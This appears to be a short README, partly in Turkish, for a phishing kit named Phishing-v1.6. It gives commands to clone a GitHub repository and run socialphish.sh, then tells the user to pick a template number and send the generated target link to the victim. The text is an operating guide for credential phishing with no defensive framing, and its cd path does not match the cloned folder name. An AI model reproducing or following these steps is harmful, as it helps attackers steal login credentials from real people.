# Phishing-v1.6
git clone https://github.com/kxxn-php/Phishing-v1.6
ls
cd Phishing-v.16
./socialphish.sh
Seçeceğiniz script sayısı 
ÖRN : 2
02
target link'i karşı tarafa atacaksınız.
